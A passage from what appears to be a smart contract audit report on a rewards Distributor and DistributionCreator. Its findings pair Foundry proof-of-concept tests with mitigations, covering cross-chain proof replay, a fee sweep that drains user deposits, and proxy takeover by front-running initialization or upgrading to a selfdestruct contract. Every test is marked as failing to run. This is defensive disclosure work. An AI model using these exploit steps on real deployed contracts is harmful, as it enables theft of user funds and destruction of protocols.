ERC20DecimalsMismatch

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.setDisputeToken

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `setDisputeToken` function allows the governor to change the `disputeToken` but does not automatically update or validate the `disputeAmount`. If the token is changed from a high-decimal token (e.g., 18 decimals) to a low-decimal token (e.g., 6 decimals) without updating the amount, the required dispute stake becomes prohibitively high (or conversely, trivially low).

## Impact
Dispute mechanism DoS (amount too high) or spam susceptibility (amount too low).

## Command to Run Test


## Proof of Concept
1. `disputeToken` is DAI (18 dec), `disputeAmount` is 100e18.
2. Governor calls `setDisputeToken(USDC)` (6 dec).
3. `disputeAmount` remains 100e18.
4. New dispute requires 100 trillion USDC.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {Distributor} from "../contracts/Distributor.sol";
import {AccessControlManager} from "../contracts/AccessControlManager.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IAccessControlManager} from "../contracts/interfaces/IAccessControlManager.sol";

contract MockERC20 is ERC20 {
    uint8 private _decimals;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
}

contract DistributorStaleTest is Test {
    Distributor distributor;
    AccessControlManager acm;
    MockERC20 dai;
    MockERC20 usdc;
    address governor = address(0x1);

    function setUp() public {
        vm.startPrank(governor);
        AccessControlManager acmImpl = new AccessControlManager();
        ERC1967Proxy acmProxy = new ERC1967Proxy(address(acmImpl), "");
        acm = AccessControlManager(address(acmProxy));
        acm.initialize(governor, governor);

        Distributor distImpl = new Distributor();
        ERC1967Proxy distProxy = new ERC1967Proxy(address(distImpl), "");
        distributor = Distributor(address(distProxy));
        distributor.initialize(IAccessControlManager(address(acm)));

        dai = new MockERC20("DAI", "DAI", 18);
        usdc = new MockERC20("USDC", "USDC", 6);
        vm.stopPrank();
    }

    function test_StaleDisputeAmount() public {
        vm.startPrank(governor);
        // 1. Initial config: 100 DAI (18 decimals)
        distributor.setDisputeToken(dai);
        uint256 amount18 = 100 * 1e18;
        distributor.setDisputeAmount(amount18);

        // 2. Admin switches token to USDC (6 decimals) but forgets to update amount
        distributor.setDisputeToken(usdc);
        vm.stopPrank();

        // 3. Verify state is stale
        assertEq(address(distributor.disputeToken()), address(usdc));
        assertEq(distributor.disputeAmount(), amount18);
        
        // Impact: 100 * 1e18 raw units of USDC (6 decimals) 
        // = 100 * 10^12 USDC tokens (100 Trillion USDC)
        // This effectively causes DoS on the dispute mechanism.
    }
}

## Suggested Mitigation
Modify `setDisputeToken` to accept a `newDisputeAmount` parameter to ensure atomic updates of both the token and the required amount. Alternatively, introduce a `setDisputeConfiguration(IERC20 token, uint256 amount)` function and deprecate the individual setters to prevent mismatched states.





 **Derived From** : StandardViolation

## [L-8]. Cross-chain Merkle proof replay risk

### Finding Severity Justification: The vulnerability relies entirely on a trusted role (Governor or Updater) erroneously publishing a Merkle root intended for one chain onto another. The protocol documentation and design ('One Merkl Root per Chain') imply that roots are chain-specific and distinct. Under Gate 5 (Governance/Centralization Risk), operational errors by trusted admins (e.g., misconfiguring parameters or data) are classified as Governance Risk and marked as Low/Info, as the code functions correctly given the provided input (the root). While including `block.chainid` in the leaf is a best practice for defense-in-depth, its absence does not constitute a direct vulnerability without the prerequisite admin error.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
Distributor._verifyProof

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Merkle leaf is calculated as `keccak256(abi.encode(user, token, amount))`. It does not include the `chainId`. If the same Merkle root is reused across different chains (e.g., due to an operational error or the same tree being published to multiple chains), a valid proof from one chain can be replayed on another to claim rewards.

## Impact
Potential double claiming or theft of rewards if roots are reused across chains.

## Command to Run Test


## Proof of Concept
1. Obtain valid proof for Chain A. 2. If Chain B has same root, call `claim` on Chain B with same proof. 3. Claim succeeds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Distributor, MerkleTree} from "../contracts/Distributor.sol";
import {IAccessControlManager} from "../contracts/interfaces/IAccessControlManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address, address, uint256) external returns (bool) { return true; }
    function approve(address, uint256) external returns (bool) { return true; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function totalSupply() external view returns (uint256) { return 0; }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract DistributorReplayTest is Test {
    Distributor distributorChainA;
    Distributor distributorChainB;
    MockERC20 token;
    MockACM acm;

    function setUp() public {
        acm = new MockACM();
        token = new MockERC20();
        Distributor impl = new Distributor();

        // Deploy Distributor A (Simulating Chain A)
        distributorChainA = Distributor(address(new ERC1967Proxy(address(impl), "")));
        distributorChainA.initialize(acm);

        // Deploy Distributor B (Simulating Chain B)
        distributorChainB = Distributor(address(new ERC1967Proxy(address(impl), "")));
        distributorChainB.initialize(acm);

        // Fund distributors
        token.mint(address(distributorChainA), 1000 ether);
        token.mint(address(distributorChainB), 1000 ether);
    }

    function testCrossChainReplay() public {
        address user = address(0xBEEF);
        uint256 amount = 100 ether;
        address[] memory users = new address[](1); users[0] = user;
        address[] memory tokens = new address[](1); tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1); amounts[0] = amount;
        
        // Create Merkle Root (Leaf = Root for single-node tree)
        // Vulnerability: No chainId in encoding
        bytes32 leaf = keccak256(abi.encode(user, address(token), amount));
        bytes32 root = leaf; 
        bytes32[][] memory proofs = new bytes32[][](1);
        proofs[0] = new bytes32[](0); 

        MerkleTree memory tree = MerkleTree({merkleRoot: root, ipfsHash: bytes32(0)});

        // 1. Update on Chain A and Claim
        distributorChainA.updateTree(tree);
        vm.warp(block.timestamp + 4000); // Pass dispute period
        
        vm.prank(user);
        distributorChainA.claim(users, tokens, amounts, proofs);
        assertEq(token.balanceOf(user), 100 ether, "Chain A Claim Failed");

        // 2. Simulate Admin Mistake: Same root pushed to Chain B
        distributorChainB.updateTree(tree);
        vm.warp(block.timestamp + 4000);

        // 3. Replay attack: Claim on Chain B using identical inputs
        // If chainId was included in the leaf, the leaf calculated on Chain B would differ
        // from the leaf used to generate the root (Chain A), causing verification failure.
        vm.prank(user);
        distributorChainB.claim(users, tokens, amounts, proofs);
        
        assertEq(token.balanceOf(user), 200 ether, "Cross-chain Replay Failed");
    }
}

## Suggested Mitigation
Include `block.chainid` in the Merkle leaf encoding.





 **Derived From** : ConfigFootgun

## [M-9]. recoverFees allows Governor to accidentally rug pull all user deposits

### Finding Severity Justification: The `recoverFees` function sweeps the entire token balance of the contract (`balanceOf(address(this))`) to the recipient. However, the contract uses a commingled balance for both accumulated protocol fees and user pre-deposits (tracked in `creatorBalance`). There is no separate accounting for fees. Consequently, if the Governor executes this function—acting in accordance with its NatSpec to 'withdraw accumulated protocol fees'—they will unavoidably transfer all user pre-deposits as well, rendering the contract insolvent and causing a loss of user funds. Per the audit rules regarding Privileged Roles, errors where an admin can accidentally brick the protocol or cause fund loss while following the specification are classified as Medium severity (Governance Footgun).
## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
AccessControl

## Location
DistributionCreator.recoverFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `recoverFees` function is intended to withdraw accumulated protocol fees. However, it executes `tokens[i].safeTransfer(to, tokens[i].balanceOf(address(this)))`. Since the contract stores both accumulated fees and user pre-deposits (tracked in `creatorBalance`) in the same contract balance without segregation, this function transfers ALL funds held by the contract, including all user deposits. This leads to a complete loss of user funds if the Governor attempts to collect fees.

## Impact
Direct theft/loss of all user pre-deposited funds held in the contract.

## Command to Run Test


## Proof of Concept
1. Users call `increaseTokenBalance` to deposit tokens (e.g. 1000 USDC).
2. Fees accumulate in the contract (e.g. 50 USDC).
3. Governor calls `recoverFees([USDC], admin)` expecting to collect the 50 USDC fees.
4. The function transfers `balanceOf(address(this))` which is 1050 USDC.
5. User deposits are gone; `creatorBalance` mapping still shows balances that are no longer backed by tokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/DistributionCreator.sol";
import "../contracts/AccessControlManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 ether);
    }
}

contract DistributionCreatorTest is Test {
    DistributionCreator internal creator;
    AccessControlManager internal accessControl;
    MockToken internal token;
    address internal governor = address(0x1);
    address internal user = address(0x2);

    function setUp() public {
        vm.startPrank(governor);
        // Deploy AccessControl
        accessControl = new AccessControlManager();
        accessControl.initialize(governor, governor);
        
        // Deploy Creator
        creator = new DistributionCreator();
        creator.initialize(IAccessControlManager(address(accessControl)), address(0x999), 0);
        
        // Deploy Token and fund user
        token = new MockToken();
        token.transfer(user, 1000 ether);
        vm.stopPrank();
    }

    function testRecoverFeesRugsUsers() public {
        // 1. User deposits funds into the contract
        vm.startPrank(user);
        token.approve(address(creator), 1000 ether);
        creator.increaseTokenBalance(user, address(token), 1000 ether);
        vm.stopPrank();

        // Pre-check: Contract holds tokens, user balance recorded
        assertEq(token.balanceOf(address(creator)), 1000 ether);
        assertEq(creator.creatorBalance(user, address(token)), 1000 ether);

        // 2. Governor calls recoverFees
        // Even with 0 fees accumulated, this function sweeps the whole balance
        vm.startPrank(governor);
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(token));
        creator.recoverFees(tokens, governor);
        vm.stopPrank();

        // 3. Verify Rug Pull
        // Contract is empty
        assertEq(token.balanceOf(address(creator)), 0);
        // Governor took everything
        assertEq(token.balanceOf(governor), 1000 ether);
        // User accounting still thinks they have funds (insolvency)
        assertEq(creator.creatorBalance(user, address(token)), 1000 ether);
    }
}

## Suggested Mitigation
Introduce a state variable to track fees separately from user deposits, e.g., `mapping(address => uint256) public accumulatedFees;`.

1. Modify `_pullTokens` to increment `accumulatedFees[rewardToken]` whenever fees are directed to `address(this)` (the default behavior when `feeRecipient` is not set).
2. Modify `recoverFees` to only transfer the amount stored in `accumulatedFees[token]`, and reset the mapping to zero upon transfer.





 **Derived From** : AccountingInvariantViolation

## [M-10]. Protocol fee recovery sweeps user pre-deposits due to commingled accounting

### Finding Severity Justification: The vulnerability allows the Governor to accidentally inadvertently wipe out all user pre-deposits while performing a standard administrative task (collecting fees). The contract defaults 'feeRecipient' to address(0), causing fees to accumulate within the contract alongside user deposits. The 'recoverFees' function is the only mechanism to retrieve these fees, but it sweeps the entire token balance without respecting user balances tracked in 'creatorBalance'. While triggered by a privileged role, this fits the specific contest caveat for Governance Risk: 'If the admin can accidentally brick the protocol even while following spec (no malice or error) — that can rise to Medium.'
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
DistributionCreator.recoverFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `recoverFees` function allows the Governor to sweep `balanceOf(address(this))` for any token. However, `DistributionCreator` holds user pre-deposits (`creatorBalance`) in the same address (`address(this)`). There is no separation or accounting variable for accumulated fees. Executing `recoverFees` to collect protocol revenue will inevitably steal all user deposits held in the contract.

## Impact
Total loss of user deposits if the Governor attempts to collect fees.

## Command to Run Test


## Proof of Concept
1. User calls `increaseTokenBalance` to deposit 1000 USDC for future campaigns.
2. Protocol accumulates 50 USDC in fees from other campaigns.
3. Governor calls `recoverFees([USDC], feeRecipient)`.
4. The function transfers `USDC.balanceOf(address(this))` (1050 USDC) to the recipient.
5. User's `creatorBalance` remains 1000, but the contract holds 0 USDC. User cannot withdraw or create campaigns.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {DistributionCreator} from "contracts/DistributionCreator.sol";
import {MockToken} from "contracts/mock/MockToken.sol";
import {IAccessControlManager} from "contracts/interfaces/IAccessControlManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract DistributionCreatorTest is Test {
    DistributionCreator internal distributionCreator;
    MockToken internal token;
    address internal user = address(0x100);
    address internal governor = address(0x200);

    function setUp() public {
        distributionCreator = new DistributionCreator();
        token = new MockToken("USDC", "USDC", 6);
        
        MockACM acm = new MockACM();
        // Initialize with generic params
        distributionCreator.initialize(acm, address(0x999), 0);
        
        token.mint(user, 1000 * 1e6);
    }

    function testExploitRecoverFees() public {
        // 1. User deposits funds intended for campaigns
        vm.startPrank(user);
        token.approve(address(distributionCreator), 1000 * 1e6);
        distributionCreator.increaseTokenBalance(user, address(token), 1000 * 1e6);
        vm.stopPrank();

        // Verify state before: User has credit, Contract has funds
        assertEq(token.balanceOf(address(distributionCreator)), 1000 * 1e6);
        assertEq(distributionCreator.creatorBalance(user, address(token)), 1000 * 1e6);

        // 2. Governor calls recoverFees. 
        // Even if there are NO fees accumulated, this function sweeps balanceOf(address(this)).
        // This simulates a scenario where the admin tries to collect fees or rescue funds, 
        // unaware it will take user deposits.
        vm.startPrank(governor);
        IERC20[] memory tokensToRecover = new IERC20[](1);
        tokensToRecover[0] = IERC20(address(token));
        distributionCreator.recoverFees(tokensToRecover, governor);
        vm.stopPrank();

        // 3. Verify Exploit: Contract is drained, but user accounting (liabilities) remains high.
        // The user effectively lost their deposit.
        assertEq(token.balanceOf(address(distributionCreator)), 0);
        assertEq(distributionCreator.creatorBalance(user, address(token)), 1000 * 1e6);
    }
}

## Suggested Mitigation
Introduce a state variable `mapping(address => uint256) public accumulatedFees` to track protocol revenue separately from user deposits. 

1. Modify `_pullTokens`: When fees are deducted and kept in the contract (i.e., when `feeRecipient` is `address(0)` or `address(this)`), increment `accumulatedFees[rewardToken]` by the fee amount.
2. Modify `recoverFees`: Instead of transferring the entire `balanceOf(address(this))`, transfer only `accumulatedFees[token]` and then reset the mapping value to 0.





 **Derived From** : UpgradeabilityInitializerSafety

## [H-11]. Uninitialized implementation allows unauthorized UUPS upgrade and potential self-destruct

### Finding Severity Justification: The vulnerability allows any user to call `upgradeToAndCall` on the implementation contract because the `accessControlManager` variable is uninitialized (zero) in the implementation storage, causing the `onlyGovernorUpgrader` modifier to bypass the authorization check (fail-open logic). By upgrading to a malicious contract and executing `selfdestruct` via `delegatecall`, an attacker can permanently delete the implementation code. While `selfdestruct` behavior was modified in the Dencun hardfork (EIP-6780) to preserve code on established contracts, the protocol supports 50+ chains (as seen in foundry.toml), many of which may not have activated EIP-6780. On such chains, this attack would brick the entire protocol (all proxies). Even on Dencun chains, unauthorized execution of arbitrary code in the implementation's context is a significant security breach.
## Derived From Pattern/Invariant
UpgradeabilityInitializerSafety

## Exploit Type
UpgradeabilityInitializerSafety

## Location
DistributionCreator._authorizeUpgrade

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `DistributionCreator` implementation contract is deployed with `accessControlManager` storage slot set to `address(0)`. The `onlyGovernorUpgrader` modifier contains a check `if (address(_accessControlManager) != address(0) && ...)` which is bypassed when the manager is zero. This allows any user to call `upgradeToAndCall` directly on the implementation contract. An attacker can upgrade the implementation to a malicious contract containing `selfdestruct` (or equivalent state corruption), permanently destroying the logic used by all proxies.

## Impact
Bricking of the entire protocol by destroying the implementation contract.

## Command to Run Test


## Proof of Concept
1. Attacker targets the deployed `DistributionCreator` implementation contract.
2. Attacker calls `upgradeToAndCall(maliciousContract, data)` on the implementation.
3. The `onlyGovernorUpgrader` modifier reads `accessControlManager` as 0, skipping the auth check.
4. `maliciousContract` executes `selfdestruct` in its `delegatecall` payload.
5. The implementation code is removed, rendering all proxies non-functional.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {DistributionCreator} from "../contracts/DistributionCreator.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

// Malicious contract to destroy the implementation
contract MaliciousUpgrader {
    function kill() external {
        selfdestruct(payable(tx.origin));
    }
}

contract DistributionCreatorSafetyTest is Test {
    function testBrickImplementation() public {
        // 1. Deploy the implementation contract directly (simulate uninitialized state)
        DistributionCreator impl = new DistributionCreator();
        
        // 2. Deploy malicious upgrader
        MaliciousUpgrader malicious = new MaliciousUpgrader();
        
        // 3. Verify code exists initially
        uint256 size;
        address addr = address(impl);
        assembly { size := extcodesize(addr) }
        assert(size > 0);

        // 4. Attack: Upgrade to malicious contract
        // Because accessControlManager is 0 in the implementation storage,
        // the onlyGovernorUpgrader modifier logic: 
        // `if (address(_accessControlManager) != address(0) && ...)` 
        // evaluates to false, bypassing the auth check.
        vm.prank(address(0xbad)); // Arbitrary attacker
        UUPSUpgradeable(address(impl)).upgradeToAndCall(
            address(malicious), 
            abi.encodeWithSignature("kill()")
        );
        
        // 5. Verify implementation code is destroyed
        // Note: On Dencun chains (EIP-6780), selfdestruct only works if the contract 
        // was created in the same transaction. This test proves the vector exists.
        assembly { size := extcodesize(addr) }
        assertEq(size, 0, "Implementation should be destroyed");
    }
}

## Suggested Mitigation
Modify the constructor of the `DistributionCreator` implementation to initialize `accessControlManager` to a non-zero address (e.g., `0xdead` or a valid manager) and disable initializers. This ensures the bypass condition `address(_accessControlManager) != address(0)` in the modifier evaluates to true, forcing the permission check.

```solidity
    constructor() {
        // Set to non-zero to prevent auth bypass in onlyGovernorUpgrader
        accessControlManager = IAccessControlManager(address(0xdead)); 
        _disableInitializers();
    }
```


## [H-12]. Proxy Hijack via Unprotected Upgrade and Initialization Front-running

### Finding Severity Justification: The vulnerability allows an attacker to completely take over the `DistributionCreator` contract (and by extension the protocol's campaign creation and fee collection) by front-running the initialization transaction. Since the contract inherits `UUPSHelper` which explicitly bypasses access control checks when `accessControlManager` is uninitialized (address 0), and the provided deployment script separates proxy creation and initialization into distinct transactions, an attacker can upgrade the proxy to a malicious implementation or initialize it themselves. This results in total loss of protocol control and potential theft of funds/fees.
## Derived From Pattern/Invariant
UpgradeabilityInitializerSafety

## Exploit Type
UpgradeabilityInitializerSafety

## Location
DistributionCreator._authorizeUpgrade

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The deployment script initializes the `DistributionCreator` proxy in a separate transaction from its deployment. During this gap, the `accessControlManager` variable in the proxy's storage is `address(0)`. The `_authorizeUpgrade` function in `DistributionCreator` (inherited via `UUPSHelper`) contains a check `if (address(_accessControlManager) != address(0) && ...)` which short-circuits and passes if `accessControlManager` is `address(0)`. This allows an attacker to front-run the initialization transaction, call `upgradeTo` to install a malicious implementation, or call `initialize` to gain ownership, effectively taking control of the protocol.

## Impact
Complete protocol takeover, loss of all future deposits and control.

## Command to Run Test


## Proof of Concept
1. Deploy `DistributionCreator` implementation.
2. Deploy `ERC1967Proxy` pointing to implementation with empty data (as per `MainDeployScript`).
3. Attacker observes the proxy deployment.
4. Attacker calls `proxy.upgradeTo(MaliciousImpl)`. The `_authorizeUpgrade` check sees `accessControlManager` is 0 and allows the upgrade.
5. Attacker's implementation can now self-destruct or backdoor the proxy.

## Proof of Code
function testFrontRunUpgrade() public {
    // 1. Deploy Implementation
    DistributionCreator impl = new DistributionCreator();
    
    // 2. Simulate Vulnerable Deployment: Proxy deployed without atomic initialization
    ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
    DistributionCreator proxyDC = DistributionCreator(address(proxy));

    // Verify strictly that it is uninitialized
    assertEq(address(proxyDC.accessControlManager()), address(0));

    // 3. Attacker Action: Deploy malicious implementation and front-run initialization
    // Since accessControlManager is address(0), the onlyGovernorUpgrader modifier short-circuits and allows access.
    DistributionCreator maliciousImpl = new DistributionCreator();
    
    // Attacker calls upgradeTo explicitly
    proxyDC.upgradeTo(address(maliciousImpl));

    // 4. Verify Upgrade: The implementation address slot should now match maliciousImpl
    bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    bytes32 currentImpl = vm.load(address(proxy), implSlot);
    assertEq(address(uint160(uint256(currentImpl))), address(maliciousImpl));
}

## Suggested Mitigation
Initialize the proxy atomically during deployment using `ERC1967Proxy(implementation, abi.encodeWithSelector(DistributionCreator.initialize.selector, ...))`.


## [H-13]. Unprotected Initialization and Upgrade allows complete protocol takeover

### Finding Severity Justification: The vulnerability allows an attacker to take full control of the DistributionCreator contract immediately after deployment by front-running the initialization transaction. Because the contract inherits UUPSHelper which permits upgrades when the AccessControlManager is address(0) (the default uninitialized state), an attacker can call `upgradeTo` to inject a malicious implementation (backdoor) before the legitimate initialization occurs. This can lead to theft of funds or protocol manipulation. This passes all gates as it is a code logic flaw (fail-open access control in uninitialized state) combined with an insecure deployment process.
## Derived From Pattern/Invariant
UpgradeabilityInitializerSafety

## Exploit Type
UpgradeabilityInitializerSafety

## Location
DistributionCreator.initialize

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `initialize` function in `DistributionCreator` is external and permissionless. The deployment script deploys the proxy and initializes it in separate transactions, creating a window where an attacker can front-run the initialization. Furthermore, the `_authorizeUpgrade` function in `UUPSHelper` bypasses access control checks if `accessControlManager` is `address(0)`. Since the proxy is uninitialized (and thus `accessControlManager` is zero) immediately after deployment, an attacker can also call `upgradeTo` to replace the implementation with malicious logic.

## Impact
An attacker can take full control of the protocol, becoming the governor, setting malicious fee recipients, or upgrading the contract logic to steal user funds.

## Command to Run Test


## Proof of Concept
1. Deploy `DistributionCreator` implementation and proxy (as in deployment script).
2. Attacker observes the proxy deployment.
3. Attacker calls `initialize` on the proxy with their own address as `accessControlManager` and `distributor`.
4. Attacker now holds the Governor role and controls the contract.

## Proof of Code
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {DistributionCreator} from "../contracts/DistributionCreator.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IAccessControlManager} from "../contracts/interfaces/IAccessControlManager.sol";

contract UnprotectedInitTest is Test {
    DistributionCreator implementation;

    function setUp() public {
        implementation = new DistributionCreator();
    }

    function test_Exploit_FrontRunInitialization() public {
        // 1. Simulate the insecure deployment script (contracts/deployment/DeployDistributionCreator)
        // The script deploys the proxy without initialization data, leaving a gap before initialize is called.
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
        DistributionCreator dc = DistributionCreator(address(proxy));

        // 2. Attacker observes the uninitialized proxy and front-runs the initialize transaction
        address attacker = makeAddr("attacker");
        address maliciousACM = makeAddr("maliciousACM");
        
        vm.startPrank(attacker);
        
        // Attacker initializes the contract with their parameters
        // They set themselves as the distributor and set a malicious AccessControlManager
        dc.initialize(
            IAccessControlManager(maliciousACM), 
            attacker, 
            0
        );
        
        vm.stopPrank();

        // 3. Verify Attack
        assertEq(dc.distributor(), attacker, "Attacker should be the distributor");
        assertEq(address(dc.accessControlManager()), maliciousACM, "Attacker should control ACM");
    }
}

## Suggested Mitigation
Ensure the proxy is initialized atomically during deployment by passing the initialization calldata to the `ERC1967Proxy` constructor. Additionally, ensure `_authorizeUpgrade` reverts if the contract is uninitialized.





 **Derived From** : ExternalCallAfterStateChange

## [H-14]. Silent swallowing of onClaim hook failure leads to lost user funds

### Finding Severity Justification: The finding identifies a critical flaw in error handling within the `_claim` function. The protocol performs an external token transfer to a recipient and subsequently calls a hook (`onClaim`) on that recipient. If this hook reverts (e.g., due to the recipient contract being paused, hitting a cap, or failing a check), the empty `catch` block silently swallows the error. Because the `safeTransfer` occurs outside the `try` block, the transfer persists while the recipient's internal state updates (which would credit the user) are reverted. This results in a permanent loss of funds for the user, as the Distributor marks the rewards as claimed. This violates the atomicity typically expected in smart contract integrations.
## Derived From Pattern/Invariant
ExternalCallAfterStateChange

## Exploit Type
UncheckedReturn

## Location
Distributor._claim

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In the `_claim` function, the contract transfers tokens to the recipient via `safeTransfer` and subsequently calls `IClaimRecipient(recipient).onClaim` within a `try/catch` block. The `catch` block is empty, causing any revert in the hook to be silently ignored. Since the token transfer occurs *before* this call and is not rolled back on hook failure, if the recipient is a smart contract (e.g., a vault) that relies on the `onClaim` callback to credit the user's deposit, the state becomes inconsistent: the vault receives the tokens, but the user is never credited, resulting in a loss of funds.

## Impact
Users claiming to smart contract recipients (vaults, wallets) will lose their funds if the recipient's hook reverts (e.g., due to temporary pausing, gas limits, or logic checks), as the funds are transferred but the recipient is not notified to credit them.

## Command to Run Test


## Proof of Concept
1. User sets a `recipient` contract that reverts inside `onClaim` (e.g., `revert('Paused')`).
2. User (or operator) calls `claim`.
3. `Distributor` transfers tokens to `recipient`.
4. `Distributor` calls `recipient.onClaim`.
5. Call reverts, caught by empty `catch`. Transaction succeeds.
6. `Distributor` marks amount as claimed.
7. `recipient` holds tokens but did not run logic to credit User. Funds are lost to the User.

## Proof of Code
import "forge-std/Test.sol";
import {Distributor, MerkleTree} from "contracts/Distributor.sol";
import {IAccessControlManager} from "contracts/interfaces/IAccessControlManager.sol";
import {IClaimRecipient} from "contracts/interfaces/IClaimRecipient.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract RevertingRecipient is IClaimRecipient {
    function onClaim(address, address, uint256, bytes memory) external pure returns (bytes32) {
        revert("Hook failed");
    }
}

contract DistributorTest is Test {
    Distributor distributor;
    MockERC20 token;
    RevertingRecipient recipient;
    address user = address(0x1);
    
    function setUp() public {
        token = new MockERC20();
        distributor = new Distributor();
        recipient = new RevertingRecipient();
        
        distributor.initialize(IAccessControlManager(address(new MockACM())));
        token.mint(address(distributor), 1000 ether);
    }

    function testSilentFundLoss() public {
        uint256 amount = 100 ether;
        bytes32 leaf = keccak256(abi.encode(user, address(token), amount));
        
        // Setup: Update tree as governor
        MerkleTree memory tree = MerkleTree({merkleRoot: leaf, ipfsHash: bytes32(0)});
        distributor.updateTree(tree);
        
        // Advance time to pass dispute period
        vm.warp(block.timestamp + 2 hours);
        
        // Setup Claim Params
        address[] memory users = new address[](1); users[0] = user;
        address[] memory tokens = new address[](1); tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1); amounts[0] = amount;
        bytes32[][] memory proofs = new bytes32[][](1); proofs[0] = new bytes32[](0);
        address[] memory recipients = new address[](1); recipients[0] = address(recipient);
        bytes[] memory datas = new bytes[](1); datas[0] = hex"1234"; // Triggers hook

        // Action: User claims to reverting recipient
        vm.prank(user);
        distributor.claimWithRecipient(users, tokens, amounts, proofs, recipients, datas);
        
        // Assertions
        (uint208 claimedAmt,,) = distributor.claimed(user, address(token));
        assertEq(claimedAmt, amount, "User should be marked as claimed");
        assertEq(token.balanceOf(address(recipient)), amount, "Recipient should have received tokens");
        // The transaction succeeded despite the hook failing, proving the silent swallow.
    }
}

## Suggested Mitigation
Remove the `try/catch` block entirely when calling `onClaim`. Since the token transfer occurs optimistically before the hook, the hook must be allowed to revert the transaction if it fails (e.g. due to internal logic checks or pausing). This ensures atomicity: either the user is successfully credited in the recipient contract, or the tokens remain in the Distributor.





 **Derived From** : UnsafeRecipient

## [H-15]. onClaim hook receives cumulative amount causing double-crediting risk

### Finding Severity Justification: The Distributor contract passes the cumulative 'amount' (from the Merkle leaf) to the 'onClaim' hook instead of the incremental 'toSend' amount (the actual value transferred). This creates a critical mismatch where recipient contracts (like vaults or wrappers) are likely to interpret the parameter as the amount of tokens received in the current transaction. This leads to double-crediting/double-spending, potentially allowing attackers to drain funds from integrated protocols by claiming small incremental rewards that trigger large cumulative credits in the recipient contract. The bug allows an attacker to repeatedly exploit the cumulative nature of the value passed to the hook.
## Derived From Pattern/Invariant
UnsafeRecipient

## Exploit Type
StandardViolation

## Location
Distributor._claim

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
